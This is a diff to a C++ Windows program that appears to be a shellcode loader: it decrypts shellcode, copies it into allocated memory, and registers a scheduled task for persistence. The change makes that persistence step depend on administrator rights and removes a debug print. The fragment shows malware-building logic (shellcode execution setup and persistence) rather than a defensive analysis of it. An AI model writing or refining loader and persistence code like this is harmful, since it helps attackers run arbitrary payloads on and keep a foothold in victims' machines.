@@ -102,8 +102,7 @@ void DecryptShellcode(LPVOID lpMem, SIZE_T size) {
 
 
 void test() {
-
-	std::wcout << "path" << std::endl;
+	
 }
 
 
@@ -223,7 +222,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 		shellcode_ptr = shellcode;
 	}
 	// =========================== Add to scheduleTask =============================
-	addScheduleTask();
+	// if has admin permission, add to scheduleTask
+	if (IsRunningAsAdmin()) {
+		addScheduleTask();
+	}
 	// ============================= Allocate Memory ===============================
 	NTSTATUS status = AllocateMem(&lpMem, &size);
 	memcpy(lpMem, shellcode_ptr, size);
